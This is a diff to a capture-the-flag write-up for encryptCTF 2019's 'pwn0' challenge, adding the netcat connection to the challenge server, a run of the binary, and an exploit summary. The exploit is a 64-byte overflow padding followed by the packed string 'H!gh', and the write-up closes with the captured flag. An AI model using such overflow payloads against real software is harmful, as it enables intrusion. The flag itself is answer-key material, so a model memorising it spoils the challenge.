@@ -1,8 +1,18 @@
 # pwn : pwn0
 
 ```
-Given pwn0
+Given netcat connect `nc 104.154.106.182 1234`
+Binary file [pwn0](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn0/pwn0?raw=true)
 ```
+* Executing Binary file
+```
+$ ./pwn0 
+How's the josh?
+input
+Your josh is low!
+Bye!
+```
+### Analyzing the Binary
 ```assembly
 $ gdb pwn0 
 GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
@@ -99,3 +109,20 @@ Legend: code, data, rodata, value
 Breakpoint 1, 0x0804854e in main ()
 gdb-peda$ 
 ```
+* It is comparing the QQQQ with H!gh
+* The padding is "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" ('A'*64)
+* payload = padding + p32("H!gh")
+* Python script [exp.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn0/exp.py)
+### output
+```
+$ python exp.py 
+[+] Starting local process './pwn0': pid 5466
+[*] Switching to interactive mode
+How's the josh?
+Good! here's the flag
+[*] Process './pwn0' stopped with exit code 0 (pid 5466)
+encryptCTF{L3t5_R4!53_7h3_J05H}
+[*] Got EOF while reading in interactive
+$
+```
+## flag is : `encryptCTF{L3t5_R4!53_7h3_J05H}`
